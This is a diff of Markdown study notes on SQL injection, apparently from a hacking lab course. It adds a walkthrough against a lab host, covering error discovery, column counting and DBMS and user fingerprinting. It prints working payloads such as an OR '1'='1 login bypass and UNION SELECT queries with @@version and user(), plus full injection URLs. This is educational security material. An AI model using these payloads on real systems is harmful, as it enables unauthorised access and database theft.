@@ -15,8 +15,11 @@ This document summarizes core techniques for discovery and exploitation of **SQL
     - [Introduction to SQL Injections](#introduction-to-sql-injections)
     - [OR Injection](#or-injection)
     - [Comment Injection](#comment-injection)
-    - [The UNION Clause](#the-union-clause)
-    - [Union Injections](#union-injections)
+    - [UNION Injection](#union-injection)
+    - [Exploitation Example - Walkthrough](#exploitation-example---walkthrough)
+        - [Discovery](#discovery)
+        - [Number of Columns](#number-of-columns)
+        - [Fingerprinting](#fingerprinting)
 
 ---
 
@@ -436,8 +439,8 @@ In-band SQL injections are the most straightforward technique. The output of the
 
 There are two types of In-band SQL injections:
 
-- Union based SQL injection
-- Error based SQL injection
+- Union based
+- Error based
 
 Blind SQL injections do not return output directly on the front-end. SQL logic must be utilized to infer the output character by character based on application behavior. 
 
@@ -488,7 +491,7 @@ A common method of testing for SQL injections is by intercepting requests using 
 
 ## OR Injection
 
-Suppose an attacker attempts to log in to a vulnerable application with the credentials `admin/admin`. The back-end SQL query may look something like this:
+Suppose an attacker attempts to log in to a **vulnerable application** with the credentials `admin/admin`. The back-end SQL query may look something like this:
 
 ```sql
 SELECT * FROM logins WHERE username = 'admin' AND password = 'admin';
@@ -510,7 +513,7 @@ admin' OR '1' = '1
 
 ![Filtered output](images/or-injection.png)
 
-Backend SQL query after injection:
+Back-end SQL query after injection:
 
 ```sql
 SELECT * FROM logins WHERE username = 'admin' OR '1'='1' AND password =''; 
@@ -536,11 +539,11 @@ With an invalid username and an invalid password, the query will evaluate to `fa
 
 - false OR (true AND false) &rarr; false OR false &rarr; false
 
-Without a valid username or password, the attacker can inject the same payload into the `password` field as well, causing the query to evaluate to true.
+Without a valid username or password, the attacker can inject the same payload into the `Password` field as well, causing the query to evaluate to true.
 
 **Example:**
 
-Backend SQL query after injection:
+Back-end SQL query after injection:
 ```sql
 SELECT * FROM logins WHERE username = 'admin' OR ('1'='1' AND password ='') OR '1'='1'; 
 ```
@@ -607,7 +610,7 @@ SELECT * FROM logins WHERE username = 'admin';
 
 ---
 
-## The UNION Clause
+## UNION Injection
 
 A `UNION` clause can be utilized to inject entire SQL queries to be executed along with the original query. The `UNION` clause combines results from multiple `SELECT` statements. A `UNION` injection can select and dump data from multiple databases and tables across the DBMS. 
 
@@ -667,7 +670,9 @@ SELECT * FROM employees UNION SELECT dept_no, dept_name, NULL, NULL, NULL, NULL 
 
 ---
 
-## Union Injections
+## Exploitation Example - Walkthrough
+
+### Discovery
 
 An attacker is targeting an application used to track shipping ports. He discovers a visible GET parameter.
 
@@ -683,7 +688,7 @@ Based on the URL he assumes that the back-end SQL query looks something like thi
 SELECT * FROM ports WHERE port_code = 'cn';
 ```
 
-He initiates the SQL injection discovery process by injecting a single quote `'`, and observes the applications behavior. 
+He initiates the SQL injection discovery process by injecting a single quote `'` and observes the applications behavior. 
 
 ```
 http://94.237.54.192:55159/search.php?port_code='
@@ -693,13 +698,15 @@ http://94.237.54.192:55159/search.php?port_code='
 
 The single quote `'` injection caused a SQL syntax error. This means that the attacker was able to input something that changed the SQL query being sent to the back-end database. This increases the probability of a SQL injection vulnerability being present. 
 
-The single quote `'` injection probably changed the SQL injection to look something like this:
+The single quote `'` injection probably changed the SQL query to look something like this:
 
 ```sql
 SELECT * FROM ports WHERE port_code = ''';
 ```
 
 The third single quote does not have a corresponding ending quote, resulting in the syntax error. 
+
+### Number of Columns
 
 Before exploiting the application the attacker must determine how many columns the table has. He can accomplish this in two ways:
 
@@ -744,3 +751,48 @@ http://94.237.54.192:55159/search.php?port_code=%27+UNION+SELECT+1%2C2%2C3%2C4--
 The fourth column returns a successful response, meaning that the table has four columns.
 
 ![Filtered output](images/union-select.png)
+
+Even though the table has four columns, all columns are not necessarily shown in the output. The attacker must figure out which columns are shown in order to determine where to inject payloads. 
+
+The attacker performs a `UNION` injection, by specifying four columns, and observes the output returned by the query.
+
+```sql
+cn' UNION SELECT 1,2,3,4--  
+```
+
+```
+http://94.237.54.192:55159/search.php?port_code=cn%27+UNION+SELECT+1%2C2%2C3%2C4--+
+```
+
+Only columns 2, 3 and 4 are displayed in the output. This means that the attacker must place the payload in one of these columns.
+
+![Filtered output](images/injection-point.png)
+
+The example above demonstrates a scenario where it is beneficial to use `INT` as junk data, instead of `NULL`. Using `INT` makes it easy to track exactly which columns are being displayed. 
+
+### Fingerprinting
+
+To develop a suitable payload, the attacker needs information about the DBMS version and the current user.
+
+It is possible to make a rough guess regarding which DBMS is being used:
+
+- If the server is **Apache** or **Nginx** and running on **Linux**, the DBMS is likely **MySQL**.
+- If the server is **IIS** running on **Windows**, the DBMS is likely **MSSQL**.
+
+To be sure regarding the DBMS and version, the attacker injects a `@@version` payload into the second column.
+
+```sql
+cn' UNION SELECT 1, @@version, 3, 4--   
+```
+
+![Filtered output](images/version-payload.png)
+
+The exact DBMS and version is `10.3.22-MariaDB-1ubuntu1`.
+
+He proceeds by fingerprinting the current user but injecting the `user()` payload into the second column.
+
+```sql
+cn' UNION SELECT 1, user(), 3, 4--   
+```
+
+![Filtered output](images/fingerprint-user.png)
